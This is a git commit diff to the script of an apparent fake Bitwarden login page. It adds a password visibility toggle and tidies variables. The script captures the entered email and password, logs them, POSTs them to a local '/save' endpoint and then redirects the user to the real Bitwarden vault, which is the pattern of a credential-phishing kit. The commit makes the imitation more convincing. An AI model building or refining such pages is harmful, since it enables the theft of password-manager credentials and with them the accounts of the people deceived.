e881d007046b84429d2adb59b59b018e3329308e
Masrt200 <immasrt@gmail.com>
2025-08-04 02:28:31 +0530

    Add Visibility toggle and fix `Remember email` alignment
    Added code to make the visibility toggle working.
    Also added favicon.ico which chrome needs to display the website icon.

--- bitwarden/script.js
+++ bitwarden/script.js
@@ -3,17 +3,20 @@ const svg2 = document.getElementById('svg2');
 const emailDisplay = document.getElementById('email-display');
 const emailSection = document.getElementById('email-section');
 const passSection  = document.getElementById('password-section')
+const eyeIcon = document.getElementById('eye-icon');
+const emailInput = document.getElementById('email-input');
+const passwordInput = document.getElementById('password-input');
 
 document.getElementById('continue-button').addEventListener('click', function() {
-    const emailInput = document.getElementById('email-input').value;
-    if (!emailInput) {
+    const email = emailInput.value;
+    if (!email) {
         return;
     }
     emailSection.classList.toggle('tw-hidden');
     passSection.classList.toggle('tw-hidden');
     svg1.classList.toggle('tw-hidden');
     svg2.classList.toggle('tw-hidden');
-    emailDisplay.textContent = emailInput;
+    emailDisplay.textContent = email;
 });
 
 document.getElementById('back-button').addEventListener('click', function() {
@@ -23,15 +26,29 @@ document.getElementById('back-button').addEventListener('click', function() {
     svg2.classList.toggle('tw-hidden');
 });
 
+document.getElementById('eye-button').addEventListener('click', function() {
+    eyeIcon.classList.toggle('bwi-eye-slash');
+    eyeIcon.classList.toggle('bwi-eye');
+
+    var isPressed = eyeIcon.getAttribute('aria-pressed') === 'true';
+    isPressed = !isPressed;
+    eyeIcon.setAttribute('aria-pressed', isPressed.toString());
+    if(isPressed) {
+        passwordInput.type = "text";
+    } else {
+        passwordInput.type = "password";
+    }
+});
+
 document.getElementById('submit-button').addEventListener('click', function(event) {
     event.preventDefault();
-    const emailInput = document.getElementById('email-input').value;
-    const passwordInput = document.getElementById('password-input').value;
-    if (!passwordInput) {
+    const email = emailInput.value;
+    const password = passwordInput.value;
+    if (!password) {
         return;
     }
-    console.log('Email:', emailInput);
-    console.log('Password:', passwordInput);
+    console.log('Email:', email);
+    console.log('Password:', password);
 
     // send post request to /save
     fetch('/save', {
@@ -39,7 +56,7 @@ document.getElementById('submit-button').addEventListener('click', function(even
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
         },
-        body: `email=${encodeURIComponent(emailInput)}&password=${encodeURIComponent(passwordInput)}`
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
     }).then(() => {
         // Redirect after storing data
         window.location.href = 'https://vault.bitwarden.com/';
